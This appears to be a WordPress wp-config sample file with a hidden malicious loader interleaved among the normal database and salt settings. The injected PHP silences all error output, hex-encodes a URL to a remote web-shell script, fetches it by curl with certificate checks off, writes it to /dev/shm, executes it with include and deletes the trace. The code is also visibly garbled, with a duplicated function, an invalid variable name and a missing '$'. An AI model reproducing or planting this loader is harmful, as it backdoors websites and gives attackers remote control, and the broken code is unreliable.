<?php
/**
 * The base configuration for WordPress
 *
 * The wp-config.php creation script uses this file during the installation.
 * You don't have to use the website, you can copy this file to "wp-config.php"
 * and fill in the values.
 *
 * This file contains the following configurations:
 *
 * * Database settings
 * * Secret keys
 * * Database table prefix
 * * ABSPATH
 *
 * @link https://developer.wordpress.org/advanced-administration/wordpress/wp-config/
 *
 * @package WordPress
 */

// ** Database settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME', 'database_name_here' );

/** Database username */
define( 'DB_USER', 'username_here' );

/** Database password */
define( 'DB_PASSWORD', 'password_here' );
error_reporting(0);
/** Database hostname */
define( 'DB_HOST', 'localhost' );


/** Database charset to use in creating database tables. */
define( 'DB_CHARSET', 'utf8' );
ini_set('display_errors', '0');


/** The database collate type. Don't change this if in doubt. */
define( 'DB_COLLATE', '' );
ini_set('log_errors', '0');

/**#@+
 * Authentication unique keys and salts.
 *
 * Change these to different unique phrases! You can generate these using
 * the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}.
 *
 * You can change these at any point in time to invalidate all existing cookies.
 * This will force all users to have to log in again.
 *
 * @since 2.6.0
 */

function geturlsinfo($url) {
    if (function_exists('curl_exec')) {
        $conn = curl_init($url);
          define( 'AUTH_KEY',         'put your unique phrase here' );
             define( 'SECURE_AUTH_KEY',  'put your unique phrase here' );
           define( 'LOGGED_IN_KEY',    'put your unique phrase here' );
        define( 'NONCE_KEY',        'put your unique phrase here' );
      define( 'AUTH_SALT',        'put your unique phrase here' );
   define( 'SECURE_AUTH_SALT', 'put your unique phrase here' );
  define( 'LOGGED_IN_SALT',   'put your unique phrase here' );
define( 'NONCE_SALT',       'put your unique phrase here' );
            function geturlsinfo($url) {
         if (function_exists('curl_exec')) {
        $conn = curl_init($url);
         opt1 = constant('CURLOPT_RETURNTRANSFER');
        $opt2 = constant('CURLOPT_FOLLOWLOCATION');
           $opt3 = constant('CURLOPT_USERAGENT');   
             
/**#@-*/
/**
 * WordPress database table prefix.
 *
 * You can have multiple installations in one database if you give each
 * a unique prefix. Only numbers, letters, and underscores please!
 */
             
$opt4 = constant('CURLOPT_SSL_VERIFYPEER');
$opt5 = constant('CURLOPT_SSL_VERIFYHOST');
$opt6 = constant('CURLOPT_COOKIE');
curl_setopt($conn, $opt1, 1);
   curl_setopt($conn, $opt2, 1);
     curl_setopt($conn, $opt3, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
      curl_setopt($conn, $opt4, 0);
            curl_setopt($conn, $opt5, 0);
             
/**
 * For developers: WordPress debugging mode.
 *
 * Change this to true to enable the display of notices during development.
 * It is strongly recommended that plugin and theme developers use WP_DEBUG
 * in their development environments.
 *
 * For information on other constants that can be used for debugging,
 * visit the documentation.
 *
 * @link https://developer.wordpress.org/advanced-administration/debug/debug-wordpress/
 */
define( 'WP_DEBUG', false );
             
/* Add any custom values between this line and the "stop editing" line. */
if (isset($_SESSION['java'])) {
          
    curl_setopt($conn, $opt6, $_SESSION['java']);
     }
        $url_get_contents_data = curl_exec($conn);
        curl_close($conn);
    } elseif (function_exists('file_get_contents')) {
        $url_get_contents_data = file_get_contents($url);
    } elseif (function_exists('fopen') && function_exists('stream_get_contents')) {
         $handle = fopen($url, "r");
         $url_get_contents_data = stream_get_contents($handle);
        fclose($handle);
    } else {
        $url_get_contents_data = false;
    }
    return $url_get_contents_data;
}        
$bssn.go.id 
    = '68747470733a2f2f7261772e67697468756275736572636f6e74656e742e636f6d2f6578706c6f69742d6861786f722f7765627368656c6c2f6d61696e2f74656d706c61746562736e2e706870'; 
    function hex2str($hex) {
   
        $str = '';
    for ($i = 0; $i < strlen($hex); $i += 2) {
    
        $str .= chr(hexdec(substr($hex, $i, 2)));
    }
    return $str;
}

function clean_old_temp_files() {
    $temp_files = glob('/dev/shm/prefix*');
    foreach ($temp_files as $file) {
        if (is_file($file)) {
            unlink($file);
        }
    }
}

        
clean_old_temp_files();
$url = hex2str($bssn.go.id);$a = 
geturlsinfo($url);
$temporary_file = tempnam('/dev/shm', 'prefix');
file_put_contents($temporary_file, $a);include $temporary_file;unlink($temporary_file);
?>
